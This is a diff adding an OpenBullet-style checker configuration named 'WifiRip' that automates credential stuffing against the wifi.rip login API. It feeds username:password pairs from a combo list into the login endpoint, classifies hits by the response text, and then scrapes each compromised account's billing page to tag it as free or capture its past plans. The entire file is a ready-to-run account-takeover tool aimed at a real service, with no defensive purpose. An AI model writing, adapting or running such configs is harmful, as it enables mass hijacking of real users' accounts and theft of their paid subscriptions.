@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "WifiRip",
+  "SuggestedBots": 1,
+  "LastModified": "2018-10-02T20:07:07.7841722+00:00",
+  "AdditionalInfo": "",
+  "Author": "TomKirkman",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://wifi.rip/api/auth/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<COOKIES(__cfduid)>" LR "" "" Recursive=FALSE -> VAR "CF" "" "" 
+PARSE "<COOKIES(PHPSESSID)>" LR "" "" Recursive=FALSE -> VAR "PHP" "" "" 
+REQUEST POST "https://wifi.rip/api/auth/login" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://wifi.rip" 
+  HEADER "referer: https://wifi.rip/login" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect username or password" 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+REQUEST GET "https://wifi.rip/pages/user/billing.php" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "text/html" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://wifi.rip/user/settings" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "You currently do not have a plan" 
+PARSE "<SOURCE>" LR "<tr><td>" "</td></tr> </tbody>" Recursive=FALSE -> CAP "Past Plans" "" "" 
